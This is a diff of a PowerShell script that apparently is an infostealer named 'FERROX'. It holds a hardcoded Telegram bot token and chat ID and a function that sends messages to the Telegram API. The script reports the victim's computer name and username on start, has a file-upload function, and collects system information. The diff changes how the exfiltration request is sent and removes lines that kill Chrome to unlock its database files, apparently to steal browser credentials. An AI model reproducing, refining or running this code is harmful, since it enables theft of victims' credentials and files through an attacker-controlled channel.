@@ -3,10 +3,9 @@ $BT="8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM"
 $CI="8468737863"
 
 function TG($t){
-    try{
-        $u="https://api.telegram.org/bot$BT/sendMessage"
-        (New-Object Net.WebClient).UploadString($u,"chat_id=$CI&text=$([Uri]::EscapeDataString($t))")|Out-Null
-    }catch{}
+    $txt=$t -replace ' ','%20' -replace '\n','%0A' -replace '#','%23' -replace '&','%26' -replace '\|','%7C'
+    $u="https://api.telegram.org/bot$BT/sendMessage?chat_id=$CI&text=$txt"
+    (New-Object Net.WebClient).DownloadString($u)|Out-Null
 }
 
 function SEND-FILE($path,$name){
@@ -33,10 +32,6 @@ function SEND-FILE($path,$name){
 }
 
 TG "FERROX: $env:COMPUTERNAME / $env:USERNAME"
-
-# Kill Chrome to unlock DB files
-Get-Process chrome -EA 0 | Stop-Process -Force -EA 0
-Start-Sleep 1
 
 # System info
 try{$os=(Get-WmiObject Win32_OperatingSystem).Caption}catch{$os="?"}
